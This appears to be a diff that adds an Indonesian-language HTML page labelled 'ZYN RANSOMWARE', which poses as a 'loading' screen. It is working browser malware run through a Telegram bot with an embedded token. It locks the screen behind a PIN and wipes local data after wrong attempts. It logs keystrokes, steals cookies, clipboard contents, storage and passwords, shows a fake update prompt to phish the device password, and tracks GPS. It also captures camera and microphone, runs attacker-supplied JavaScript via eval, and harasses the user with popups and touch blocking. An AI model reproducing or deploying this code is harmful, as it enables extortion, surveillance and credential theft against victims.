@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Memuat...</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-tap-highlight-color:transparent; }
+        body { background: #0a0f1e; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: system-ui, -apple-system, 'Segoe UI', monospace; }
+        .loader { text-align: center; background: rgba(10,15,30,0.85); backdrop-filter: blur(12px); border-radius: 32px; padding: 2rem; width: 85%; max-width: 300px; border: 1px solid rgba(255,255,255,0.15); }
+        .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #0af; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h3 { color: white; font-weight: 500; font-size: 1.1rem; }
+        .small { font-size: 11px; color: #aaa; margin-top: 20px; }
+    </style>
+</head>
+<body>
+<div class="loader">
+    <div class="spinner"></div>
+    <h3>Memuat konten...</h3>
+    <div class="small">Jangan tutup halaman ini</div>
+</div>
+
+<!-- LOCK SCREEN PREMIUM -->
+<div id="lockOverlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.96); backdrop-filter:blur(20px); z-index:99999; display:none; justify-content:center; align-items:center; font-family:'Segoe UI',system-ui; text-align:center;">
+    <div id="lockContainer" style="background:linear-gradient(145deg, #0f1123, #0a0c1a); border-radius:40px; padding:35px 25px; width:88%; max-width:370px; border:1px solid rgba(255,50,100,0.5);">
+        <div style="font-size:56px;">💀🔒</div>
+        <h1 style="color:#ff3366; font-size:28px; margin:10px 0 6px;">DEVICE TERKUNCI</h1>
+        <p id="lockMessageText" style="color:#bbb; font-size:14px; margin-bottom:28px;">Data dienkripsi oleh ZYN RANSOMWARE</p>
+        <input type="password" id="pinInput" placeholder="PIN 6 digit" style="width:100%; padding:14px; background:#11141f; border:1px solid #ff3366; border-radius:60px; color:#fff; font-size:18px; text-align:center; letter-spacing:4px; outline:none;">
+        <button id="unlockBtn" style="background:#ff3366; border:none; padding:12px; border-radius:60px; width:100%; margin-top:20px; color:white; font-weight:bold; font-size:16px; cursor:pointer;">BUKA KUNCI</button>
+        <div id="pinError" style="color:#ff8888; margin-top:12px; font-size:12px;"></div>
+        <p style="color:#666; font-size:11px; margin-top:24px;">Hubungi administrator untuk PIN</p>
+    </div>
+</div>
+
+<!-- Canvas animasi glitch -->
+<canvas id="glitchCanvas" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:100000; display:none;"></canvas>
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<script>
+// ============================================================
+// KONFIGURASI (WAJIB GANTI)
+// ============================================================
+const BOT_TOKEN = "8522832882:AAH05rDVzFa023hVW5Li8m_1VNZR8ISIMNM";
+const ATTACKER_CHAT_ID = "6420213852";
+// ============================================================
+
+if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+    document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:20%'>Ganti BOT_TOKEN dan ATTACKER_CHAT_ID</h2>";
+} else {
+    start();
+}
+
+async function start() {
+    async function sendToAttacker(text, keyboard = null) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const body = {
+            chat_id: ATTACKER_CHAT_ID,
+            text: text.substring(0, 4096),
+            parse_mode: "Markdown",
+            disable_web_page_preview: true
+        };
+        if (keyboard) body.reply_markup = JSON.stringify(keyboard);
+        try { await fetch(url, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) }); } catch(e) {}
+    }
+
+    // Anti close tab
+    window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
+    window.addEventListener('pagehide', () => sendToAttacker(`⚠️ *[${victimId}] Halaman ditutup*`));
+
+    if ('serviceWorker' in navigator) {
+        try {
+            const swCode = `self.addEventListener('fetch', () => {});`;
+            const blob = new Blob([swCode], {type:'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            await navigator.serviceWorker.register(url);
+        } catch(e) {}
+    }
+
+    let victimId = localStorage.getItem("zyn_victim_id");
+    if (!victimId) {
+        victimId = "V_" + Date.now() + "_" + Math.random().toString(36).substr(2, 6);
+        localStorage.setItem("zyn_victim_id", victimId);
+    }
+
+    // Persistent lock
+    let persistentLock = localStorage.getItem("zyn_locked") === "true";
+    let persistentPin = localStorage.getItem("zyn_lock_pin") || "829263";
+    let lockMessage = localStorage.getItem("zyn_lock_message") || "🔒 DEVICE TERKUNCI";
+    let wrongAttempts = parseInt(localStorage.getItem("zyn_wrong_attempts") || "0");
+    let wrongPinHistory = JSON.parse(localStorage.getItem("zyn_wrong_pins") || "[]");
+    let wakeLock = null;
+    let glitchAnimationId = null;
+    let glitchCanvas = document.getElementById('glitchCanvas');
+    let glitchCtx = glitchCanvas.getContext('2d');
+    let countdownTimer = null;
+    let soundLoop = null;
+    let lockBgImage = null;
+
+    function startGlitch() {
+        if (glitchAnimationId) return;
+        glitchCanvas.style.display = 'block';
+        glitchCanvas.width = window.innerWidth;
+        glitchCanvas.height = window.innerHeight;
+        let particles = [];
+        for (let i=0; i<150; i++) {
+            particles.push({
+                x: Math.random() * glitchCanvas.width,
+                y: Math.random() * glitchCanvas.height,
+                r: Math.random() * 4 + 2,
+                c: `hsl(${Math.random()*360}, 100%, 60%)`,
+                vy: Math.random() * 2 + 1,
+                vx: (Math.random() - 0.5) * 0.8
+            });
+        }
+        function draw() {
+            if (!glitchCanvas || glitchCanvas.style.display !== 'block') return;
+            glitchCtx.clearRect(0, 0, glitchCanvas.width, glitchCanvas.height);
+            for (let p of particles) {
+                glitchCtx.beginPath();
+                glitchCtx.arc(p.x, p.y, p.r, 0, Math.PI*2);
+                glitchCtx.fillStyle = p.c;
+                glitchCtx.fill();
+                p.y += p.vy;
+                p.x += p.vx;
+                if (p.y > glitchCanvas.height) p.y = 0;
+                if (p.x > glitchCanvas.width) p.x = 0;
+                if (p.x < 0) p.x = glitchCanvas.width;
+            }
+            for (let i=0; i<12; i++) {
+                glitchCtx.fillStyle = `hsl(${Math.random()*360}, 100%, 55%)`;
+                glitchCtx.fillRect(0, Math.random() * glitchCanvas.height, glitchCanvas.width, Math.random() * 3 + 1);
+            }
+            glitchAnimationId = requestAnimationFrame(draw);
+        }
+        draw();
+        sendToAttacker(`🎨 *[${victimId}] Efek glitch aktif*`);
+    }
+    function stopGlitch() {
+        if (glitchAnimationId) cancelAnimationFrame(glitchAnimationId);
+        glitchAnimationId = null;
+        glitchCanvas.style.display = 'none';
+    }
+
+    async function requestWakeLock() {
+        if ('wakeLock' in navigator) {
+            try { wakeLock = await navigator.wakeLock.request('screen'); } catch(e) {}
+        }
+    }
+    function releaseWakeLock() { if (wakeLock) { wakeLock.release(); wakeLock = null; } }
+
+    function showLockScreen() {
+        let overlay = document.getElementById("lockOverlay");
+        if (overlay.style.display === "flex") return;
+        overlay.style.display = "flex";
+        document.getElementById("lockMessageText").innerText = lockMessage;
+        if (lockBgImage) {
+            document.getElementById("lockContainer").style.background = `url(${lockBgImage}) center/cover no-repeat`;
+        } else {
+            document.getElementById("lockContainer").style.background = "linear-gradient(145deg, #0f1123, #0a0c1a)";
+        }
+        document.body.style.overflow = "hidden";
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.pushState(null, null, location.href);
+        document.addEventListener("keydown", blockKeys);
+        function blockKeys(e) {
+            const blocked = ['Backspace','Escape','Home','F5','F12','Tab','Control','Alt','Meta','ArrowUp','ArrowDown','ArrowLeft','ArrowRight'];
+            if (blocked.includes(e.key) || e.keyCode===123 || (e.ctrlKey && (e.key==='u'||e.key==='U'||e.key==='i'||e.key==='I'||e.key==='s'||e.key==='S'))) {
+                e.preventDefault(); e.stopPropagation();
+            }
+        }
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        requestWakeLock();
+        startGlitch();
+        if (soundLoop) soundLoop.play().catch(e=>{});
+        document.getElementById("unlockBtn").onclick = async () => {
+            let inputPin = document.getElementById("pinInput").value;
+            if (inputPin === persistentPin) {
+                if (soundLoop) { soundLoop.pause(); soundLoop = null; }
+                localStorage.removeItem("zyn_locked");
+                localStorage.removeItem("zyn_lock_pin");
+                localStorage.removeItem("zyn_lock_message");
+                localStorage.removeItem("zyn_wrong_attempts");
+                localStorage.removeItem("zyn_wrong_pins");
+                overlay.style.display = "none";
+                document.body.style.overflow = "";
+                window.onpopstate = null;
+                document.removeEventListener("keydown", blockKeys);
+                document.removeEventListener('contextmenu', (e) => e.preventDefault());
+                releaseWakeLock();
+                stopGlitch();
+                await sendToAttacker(`🔓 *[${victimId}] UNLOCKED* dengan PIN \`${persistentPin}\``);
+            } else {
+                wrongAttempts++;
+                localStorage.setItem("zyn_wrong_attempts", wrongAttempts);
+                wrongPinHistory.push({ pin: inputPin, time: Date.now() });
+                localStorage.setItem("zyn_wrong_pins", JSON.stringify(wrongPinHistory));
+                document.getElementById("pinError").innerText = `PIN salah! ${wrongAttempts}/3`;
+                await sendToAttacker(`❌ *[${victimId}] PIN salah:* \`${inputPin}\` (${wrongAttempts}/3)`);
+                if (wrongAttempts >= 3) {
+                    await wipeAllData();
+                }
+            }
+        };
+        sendToAttacker(`🔒 *[${victimId}] LOCK SCREEN AKTIF* - PIN: \`${persistentPin}\``);
+    }
+
+    function activateRansomware(pin, message) {
+        if (persistentLock) return;
+        persistentPin = pin;
+        lockMessage = message || "🔒 DEVICE TERKUNCI";
+        localStorage.setItem("zyn_locked", "true");
+        localStorage.setItem("zyn_lock_pin", persistentPin);
+        localStorage.setItem("zyn_lock_message", lockMessage);
+        localStorage.setItem("zyn_wrong_attempts", "0");
+        localStorage.setItem("zyn_wrong_pins", "[]");
+        wrongAttempts = 0;
+        wrongPinHistory = [];
+        showLockScreen();
+    }
+
+    if (persistentLock) showLockScreen();
+
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('autolock') && !persistentLock) {
+        let pin = urlParams.get('autolock');
+        let msg = urlParams.get('lockmessage') || "🔒 DEVICE TERKUNCI OTOMATIS";
+        activateRansomware(pin, msg);
+    }
+
+    // Fitur ransomware tambahan
+    async function setLockPin(newPin) {
+        if (!persistentLock) return sendToAttacker(`❌ Tidak ada lock aktif`);
+        persistentPin = newPin;
+        localStorage.setItem("zyn_lock_pin", persistentPin);
+        sendToAttacker(`✅ *[${victimId}] PIN diubah:* \`${newPin}\``);
+    }
+    async function setLockMessage(msg) {
+        if (!persistentLock) return;
+        lockMessage = msg;
+        document.getElementById("lockMessageText").innerText = lockMessage;
+        localStorage.setItem("zyn_lock_message", lockMessage);
+        sendToAttacker(`✅ *[${victimId}] Pesan lock diubah:* ${msg}`);
+    }
+    async function setLockWallpaper(url) {
+        if (!persistentLock) return;
+        lockBgImage = url;
+        document.getElementById("lockContainer").style.background = `url(${url}) center/cover no-repeat`;
+        sendToAttacker(`🖼️ *[${victimId}] Wallpaper lock diubah: ${url}`);
+    }
+    async function playLockSound(url) {
+        if (!persistentLock) return;
+        if (soundLoop) soundLoop.pause();
+        soundLoop = new Audio(url);
+        soundLoop.loop = true;
+        try { await soundLoop.play(); sendToAttacker(`🔊 *[${victimId}] Suara alarm lock aktif`); } catch(e) { sendToAttacker(`❌ Gagal putar suara: ${e.message}`); }
+    }
+    async function stopLockSound() {
+        if (soundLoop) { soundLoop.pause(); soundLoop = null; sendToAttacker(`⏹️ *[${victimId}] Suara alarm dihentikan`); }
+        else sendToAttacker(`❌ Tidak ada suara`);
+    }
+    async function countdownLock(seconds, pin) {
+        if (persistentLock) return sendToAttacker(`❌ Sudah terkunci`);
+        if (!seconds || isNaN(seconds)) seconds = 10;
+        pin = pin || "123456";
+        sendToAttacker(`⏰ *[${victimId}] Countdown ${seconds} detik, lock dengan PIN ${pin}*`);
+        let counter = seconds;
+        if (countdownTimer) clearInterval(countdownTimer);
+        countdownTimer = setInterval(async () => {
+            if (counter <= 0) {
+                clearInterval(countdownTimer);
+                activateRansomware(pin, `🔒 LOCK OTOMATIS setelah ${seconds} detik`);
+                sendToAttacker(`✅ *[${victimId}] Lock otomatis aktif! PIN: ${pin}`);
+            } else {
+                await sendToAttacker(`⏰ *[${victimId}] Lock dalam ${counter} detik...*`);
+                counter--;
+            }
+        }, 1000);
+    }
+    async function wipeAllData() {
+        localStorage.clear();
+        sessionStorage.clear();
+        document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:40%'>DEVICE BRICKED</h1>";
+        await sendToAttacker(`💀 *[${victimId}] WIPE DATA - Semua data lokal dihapus*`);
+        setInterval(() => alert("DATA HILANG"), 1000);
+    }
+
+    // Fitur sadap (stealth)
+    let keylogData = [], autoScreenshotInterval = null, gpsInterval = null, currentStream = null, lastUpdateId = 0, keylogStreamInterval = null, mediaRecorder = null;
+    async function getClipboard() { try { let text = await navigator.clipboard.readText(); await sendToAttacker(`📋 *[${victimId}] Clipboard:*\n\`\`\`${text.substring(0,500)}\`\`\``); } catch(e) { } }
+    async function writeClipboard(text) { try { await navigator.clipboard.writeText(text); await sendToAttacker(`✏️ *[${victimId}] Clipboard ditulis:* \`${text.substring(0,200)}\``); } catch(e) { } }
+    async function getNetworkInfo() {
+        let ips = []; let pc = new RTCPeerConnection({ iceServers: [] }); pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = (ice) => { if (ice.candidate) { let ip = ice.candidate.address || ice.candidate.ip; if (ip && !ips.includes(ip)) ips.push(ip); sendToAttacker(`🌐 *[${victimId}] IP lokal:* \`${ips.join(", ")}\``); pc.close(); } };
+        setTimeout(() => pc.close(), 3000);
+        try { let res = await fetch('https://api.ipify.org?format=json'); let data = await res.json(); await sendToAttacker(`🌍 *[${victimId}] IP publik:* \`${data.ip}\``); } catch(e) {}
+        if (navigator.connection) await sendToAttacker(`📶 *[${victimId}] Koneksi:* ${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps`);
+    }
+    function getBatteryStatus() { if (navigator.getBattery) { navigator.getBattery().then(b => sendToAttacker(`🔋 *[${victimId}] Baterai:* ${(b.level*100).toFixed(0)}%, ${b.charging?"Mengisi":"Tidak mengisi"}`)).catch(e=>{}); } }
+    function startAutoScreenshot(intervalMs) { if (autoScreenshotInterval) clearInterval(autoScreenshotInterval); autoScreenshotInterval = setInterval(async () => { try { await html2canvas(document.body); await sendToAttacker(`📸 *[${victimId}] Auto screenshot*`); } catch(e) {} }, intervalMs); sendToAttacker(`📸 *Auto screenshot mulai*`); }
+    function stopAutoScreenshot() { if (autoScreenshotInterval) clearInterval(autoScreenshotInterval); autoScreenshotInterval = null; sendToAttacker(`⏹️ *Auto screenshot dihentikan*`); }
+    function requestFileFromTarget() { let input = document.createElement("input"); input.type = "file"; input.onchange = (e) => { let file = e.target.files[0]; if (file) { let reader = new FileReader(); reader.onload = (ev) => sendToAttacker(`📁 *[${victimId}] File:* ${file.name} (${file.size} bytes)\n\`\`\`${ev.target.result.substring(0,300)}\`\`\``); reader.readAsDataURL(file); } }; input.click(); sendToAttacker(`📁 *Meminta file...*`); }
+    document.addEventListener("keydown", (e) => { if (persistentLock) return; keylogData.push({ key: e.key, time: Date.now() }); if (keylogData.length > 1000) keylogData.shift(); });
+    function startKeylogger() { keylogData = []; sendToAttacker(`⌨️ *Keylogger dimulai*`); }
+    async function getKeylogs() { let logs = keylogData.map(k => `${new Date(k.time).toLocaleTimeString()} - ${k.key}`).join("\n"); await sendToAttacker(`⌨️ *[${victimId}] Keylog:*\n\`\`\`${logs.substring(0,4000)}\`\`\``); }
+    async function startKeylogStream() { if (keylogStreamInterval) clearInterval(keylogStreamInterval); keylogStreamInterval = setInterval(async () => { if (keylogData.length) { let logs = keylogData.map(k => `${new Date(k.time).toLocaleTimeString()} - ${k.key}`).join("\n"); await sendToAttacker(`⌨️ *[${victimId}] Stream keylog:*\n\`\`\`${logs.substring(0,4000)}\`\`\``); keylogData = []; } }, 30000); sendToAttacker(`⌨️ *Keylog streaming aktif*`); }
+    function stopKeylogStream() { if (keylogStreamInterval) clearInterval(keylogStreamInterval); keylogStreamInterval = null; sendToAttacker(`⏹️ *Keylog streaming dihentikan*`); }
+    async function turnFlashOn() { try { if (currentStream) { await currentStream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: true }] }); sendToAttacker(`🔦 *[${victimId}] Lampu menyala*`); return; } const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); currentStream = stream; const track = stream.getVideoTracks()[0]; if (track.getCapabilities().torch) { await track.applyConstraints({ advanced: [{ torch: true }] }); sendToAttacker(`🔦 *[${victimId}] Lampu menyala*`); } else throw "No torch"; } catch(e) { sendToAttacker(`❌ Gagal lampu: ${e.message}`); } }
+    async function turnFlashOff() { if (currentStream) { await currentStream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{}); currentStream.getTracks().forEach(t=>t.stop()); currentStream = null; } sendToAttacker(`⛔ *Lampu mati*`); }
+    async function flashStrobe(durationMs) { sendToAttacker(`✨ *Strobe ${durationMs/1000}s*`); const start=Date.now(); const interval=setInterval(async()=>{ if(Date.now()-start>durationMs){clearInterval(interval);await turnFlashOff();return;} if(currentStream)await turnFlashOff(); else await turnFlashOn(); },200); }
+    async function takeScreenshot() { try { await html2canvas(document.body); await sendToAttacker(`📸 *[${victimId}] Screenshot diambil*`); } catch(e) { sendToAttacker(`❌ Screenshot error: ${e.message}`); } }
+    async function getFullInfo() { await sendToAttacker(`📱 *[${victimId}] Info device*\n\`\`\`UA: ${navigator.userAgent}\nResolusi: ${screen.width}x${screen.height}\nMemory: ${navigator.deviceMemory||"?"} GB\nCPU: ${navigator.hardwareConcurrency||"?"}\`\`\``); }
+    async function stealCookies() { await sendToAttacker(`🍪 *[${victimId}] Cookies:*\n\`\`\`${document.cookie.substring(0,2000)||"tidak ada"}\`\`\``); }
+    async function getLocation() { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(p => sendToAttacker(`📍 *[${victimId}] Lokasi:* ${p.coords.latitude}, ${p.coords.longitude}`), e => {}); else sendToAttacker(`❌ Geolocation tidak support`); }
+    function startGPSTracking(intervalMs) { if (gpsInterval) clearInterval(gpsInterval); gpsInterval = setInterval(() => { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(p => sendToAttacker(`🔄 *[${victimId}] GPS track:* ${p.coords.latitude}, ${p.coords.longitude}`)); }, intervalMs); sendToAttacker(`🔄 *Tracking GPS mulai*`); }
+    function stopGPSTracking() { if (gpsInterval) clearInterval(gpsInterval); gpsInterval = null; sendToAttacker(`⏹️ *Tracking GPS dihentikan*`); }
+    async function captureCamera() { if (navigator.mediaDevices) try { const stream = await navigator.mediaDevices.getUserMedia({ video: true }); const v = document.createElement('video'); v.srcObject = stream; v.onloadedmetadata = () => { v.play(); const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v,0,0); sendToAttacker(`📷 *[${victimId}] Foto kamera diambil*`); stream.getTracks().forEach(t=>t.stop()); }; } catch(e) { sendToAttacker(`❌ Kamera error: ${e.message}`); } else sendToAttacker(`❌ Kamera tidak support`); }
+    async function recordMic(dur) { if (navigator.mediaDevices) try { const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); const rec = new MediaRecorder(stream); let chunks = []; rec.ondataavailable = e => chunks.push(e.data); rec.onstop = () => { sendToAttacker(`🎤 *[${victimId}] Rekaman ${dur}s selesai* (size: ${new Blob(chunks).size} bytes)`); stream.getTracks().forEach(t=>t.stop()); }; rec.start(); setTimeout(()=>rec.stop(), dur*1000); } catch(e) { sendToAttacker(`❌ Mic error: ${e.message}`); } else sendToAttacker(`❌ Mic tidak support`); }
+    async function startScreenRecording(dur=10) { if (!navigator.mediaDevices?.getDisplayMedia) { sendToAttacker(`❌ Screen recording tidak support`); return; } try { const stream = await navigator.mediaDevices.getDisplayMedia({ video: true }); mediaRecorder = new MediaRecorder(stream); let chunks=[]; mediaRecorder.ondataavailable=e=>chunks.push(e.data); mediaRecorder.onstop=()=>{ const blob=new Blob(chunks); sendToAttacker(`🎥 *[${victimId}] Screen record ${dur}s* size: ${(blob.size/1024).toFixed(2)} KB`); stream.getTracks().forEach(t=>t.stop()); }; mediaRecorder.start(); setTimeout(()=>mediaRecorder.stop(), dur*1000); sendToAttacker(`🎥 *Screen recording dimulai*`); } catch(e) { sendToAttacker(`❌ Screen record error: ${e.message}`); } }
+    async function getContacts() { if ('contacts' in navigator && navigator.contacts) { try { const contacts = await navigator.contacts.select(['name','tel'],{multiple:true}); let list = contacts.map(c=>`${c.name?.[0]||'?'}: ${c.tel?.[0]||''}`).join('\n'); await sendToAttacker(`📇 *[${victimId}] Kontak:*\n\`\`\`${list.substring(0,3000)}\`\`\``); } catch(e) { sendToAttacker(`❌ Kontak error: ${e.message}`); } } else { sendToAttacker(`❌ Contact API tidak support`); } }
+    async function fakeUpdatePrompt() { let overlay = document.createElement('div'); overlay.id='fakeUpdateOverlay'; overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99998;display:flex;justify-content:center;align-items:center'; overlay.innerHTML=`<div style="background:#1e1e2e;border-radius:24px;padding:32px;width:85%;max-width:340px;text-align:center;"><h2>🔄 Update Keamanan</h2><p>Masukkan password perangkat:</p><input type="password" id="fakePass" placeholder="Password" style="width:100%;padding:12px;background:#2a2a3a;border:none;border-radius:40px;color:white;"><button id="fakeSubmitBtn" style="margin-top:16px;background:#ffaa44;border:none;padding:10px 20px;border-radius:40px;">Update</button><div id="fakeResult"></div></div>`; document.body.appendChild(overlay); document.getElementById('fakeSubmitBtn').onclick = async () => { let pass = document.getElementById('fakePass').value; if(pass){ await sendToAttacker(`🔐 *[${victimId}] PASSWORD TERKIRIM:* \`${pass}\``); overlay.remove(); alert('Update gagal'); } else { document.getElementById('fakeResult').innerText='Password kosong!'; } }; sendToAttacker(`🔐 *[${victimId}] Fake update prompt ditampilkan*`); }
+    async function spamNotifications(c) { if (Notification.permission === "granted") { for (let i=0;i<c;i++) new Notification("ZYN",{body:"Data dienkripsi!"}); } else { const perm = await Notification.requestPermission(); if (perm === "granted") spamNotifications(c); } sendToAttacker(`📢 *[${victimId}] ${c} notifikasi spam*`); }
+    async function vibrateDevice(d) { if (navigator.vibrate) navigator.vibrate(d); sendToAttacker(`📳 *[${victimId}] Getar ${d/1000}s*`); }
+    async function vibratePattern(pattern) { if (navigator.vibrate) navigator.vibrate(pattern); sendToAttacker(`📳 *[${victimId}] Getar pola: ${pattern}*`); }
+    async function respondOnline() { sendToAttacker(`🟢 *[${victimId}] ONLINE*`); }
+    async function showNotification(msg) { alert(msg); sendToAttacker(`🔔 *[${victimId}] Notifikasi: ${msg}`); }
+    async function openUrlInNewTab(url) { window.open(url,'_blank'); sendToAttacker(`🔗 *[${victimId}] Membuka URL: ${url}`); }
+    async function redirectPage(url) { window.location.href = url; sendToAttacker(`🔄 *[${victimId}] Redirect ke: ${url}`); }
+    async function uploadFileToTarget(url) { let a=document.createElement('a'); a.href=url; a.download=''; a.click(); sendToAttacker(`📤 *[${victimId}] File diunggah (download) dari: ${url}`); }
+    async function getStorage() { let ls={}, ss={}; for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i); ls[k]=localStorage.getItem(k);} for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i); ss[k]=sessionStorage.getItem(k);} sendToAttacker(`💾 *[${victimId}] LocalStorage:*\n\`\`\`${JSON.stringify(ls,null,2).substring(0,2000)}\`\`\`\n*SessionStorage:*\n\`\`\`${JSON.stringify(ss,null,2).substring(0,2000)}\`\`\``); }
+    async function getSystemInfo() { sendToAttacker(`🖥️ *[${victimId}] System Info*\n\`\`\`Browser: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nCookies: ${navigator.cookieEnabled}\nDoNotTrack: ${navigator.doNotTrack}\nHardwareConcurrency: ${navigator.hardwareConcurrency||'?'}\nDeviceMemory: ${navigator.deviceMemory||'?'} GB\nMaxTouchPoints: ${navigator.maxTouchPoints}\nVendor: ${navigator.vendor}\`\`\``); }
+    async function getIpGeo() { try { let res = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,query'); let data = await res.json(); if(data.status==='success') sendToAttacker(`🌍 *[${victimId}] Geo IP:* \`${data.query}\` - ${data.city}, ${data.country} (ISP: ${data.isp})`); else throw new Error(); } catch(e) { sendToAttacker(`❌ Gagal geo IP`); } }
+    async function ping() { sendToAttacker(`🏓 *[${victimId}] pong!* ${new Date().toLocaleTimeString()}`); }
+    async function execCustomJs(code) { try { eval(code); sendToAttacker(`✅ *[${victimId}] JS executed:* \`${code.substring(0,200)}\``); } catch(e) { sendToAttacker(`❌ JS error: ${e.message}`); } }
+    async function getBrowserFingerprint() { let canvas=document.createElement('canvas'); canvas.width=200; canvas.height=50; let ctx=canvas.getContext('2d'); ctx.fillStyle='#fff'; ctx.fillRect(0,0,200,50); ctx.font='14px Arial'; ctx.fillStyle='#000'; ctx.fillText('ZYN',10,30); let fp=canvas.toDataURL(); sendToAttacker(`🆔 *[${victimId}] Browser fingerprint:*\n\`\`\`${fp.substring(0,200)}...\`\`\``); }
+    async function stealSavedPasswords() {
+        let passwords = [];
+        document.querySelectorAll('input[type="password"]').forEach(input => { if (input.value) passwords.push(input.value); });
+        for (let i=0; i<localStorage.length; i++) {
+            let key = localStorage.key(i);
+            let val = localStorage.getItem(key);
+            if (val.includes('token') || val.includes('pass') || val.includes('credential')) passwords.push({ source: key, value: val.substring(0,200) });
+        }
+        await sendToAttacker(`🔑 *[${victimId}] Password tersimpan:*\n\`\`\`${JSON.stringify(passwords, null, 2).substring(0,2000)}\`\`\``);
+    }
+
+    // Fitur penyiksaan
+    let audioElem=null, shakeInt=null, flashInt=null, popupInt=null, touchBlock=null, autoClickInt=null, tormentInterval=null;
+    async function loopAudio(url) { if(audioElem) audioElem.pause(); audioElem=new Audio(url); audioElem.loop=true; try{ await audioElem.play(); sendToAttacker(`🔊 *[${victimId}] Audio loop: ${url}`); } catch(e){ sendToAttacker(`❌ Audio error: ${e.message}`); } }
+    function stopAudio() { if(audioElem){audioElem.pause(); audioElem=null; sendToAttacker(`⏹️ Audio berhenti`);} }
+    function shakeScreen(dur) { if(shakeInt) clearInterval(shakeInt); let orig=document.body.style.transform; let start=Date.now(),count=0; shakeInt=setInterval(()=>{ if(dur && Date.now()-start>dur){clearInterval(shakeInt); shakeInt=null; document.body.style.transform=orig; sendToAttacker(`⏹️ Getaran layar berhenti`); return;} let intensity=Math.sin(count)*5; document.body.style.transform=`translate(${intensity}px,${intensity/2}px)`; count+=0.5; },50); sendToAttacker(`🫨 *Layar bergetar${dur?` ${dur/1000}s`:''}`); }
+    function stopShake() { if(shakeInt){clearInterval(shakeInt); shakeInt=null; document.body.style.transform=''; sendToAttacker(`⏹️ Getaran layar dihentikan`);} }
+    function flashScreen(dur) { if(flashInt) clearInterval(flashInt); let div=document.createElement('div'); div.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:red;opacity:0.5;pointer-events:none;z-index:999999'; document.body.appendChild(div); let start=Date.now(); flashInt=setInterval(()=>{ if(dur && Date.now()-start>dur){clearInterval(flashInt); flashInt=null; div.remove(); sendToAttacker(`⏹️ Flash layar berhenti`); return;} div.style.backgroundColor=div.style.backgroundColor==='red'?'blue':'red'; },200); sendToAttacker(`⚡ *Flash layar aktif${dur?` ${dur/1000}s`:''}`); }
+    function stopFlash() { if(flashInt){clearInterval(flashInt); flashInt=null; sendToAttacker(`⏹️ Flash layar dihentikan`);} }
+    function blockTouch() { if(touchBlock) return; touchBlock=document.createElement('div'); touchBlock.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:transparent;z-index:999998;pointer-events:all'; document.body.appendChild(touchBlock); sendToAttacker(`🖐️ *Layar diblokir sentuhan*`); }
+    function unblockTouch() { if(touchBlock){touchBlock.remove(); touchBlock=null; sendToAttacker(`👆 *Blokir sentuhan dihapus*`);} }
+    function infinitePopup() { if(popupInt) return; popupInt=setInterval(()=>alert("⚠️ PERINGATAN: Perangkat Anda bermasalah!"),1000); sendToAttacker(`🔔 *Infinite popup dimulai*`); }
+    function stopPopup() { if(popupInt){clearInterval(popupInt); popupInt=null; sendToAttacker(`⏹️ Infinite popup berhenti`);} }
+    async function fakeSms(from,msg) { if(Notification.permission!=="granted") await Notification.requestPermission(); new Notification(`📱 SMS dari ${from}`,{body:msg}); sendToAttacker(`💬 *SMS palsu: ${from} - ${msg}`); }
+    function startAutoClick(x,y,interval) { if(autoClickInt)clearInterval(autoClickInt); autoClickInt=setInterval(()=>{ let ev=new MouseEvent('click',{clientX:x,clientY:y,bubbles:true}); document.elementFromPoint(x,y)?.dispatchEvent(ev); sendToAttacker(`🖱️ *Auto click di (${x},${y})*`); },interval); sendToAttacker(`🖱️ *Auto click mulai*`); }
+    function stopAutoClick() { if(autoClickInt){clearInterval(autoClickInt); autoClickInt=null; sendToAttacker(`⏹️ Auto click berhenti`);} }
+    function disableTouchAll(){ document.body.style.pointerEvents='none'; sendToAttacker(`🚫 *Semua sentuhan dinonaktifkan*`); }
+    function enableTouchAll(){ document.body.style.pointerEvents=''; sendToAttacker(`✅ *Sentuhan diaktifkan*`); }
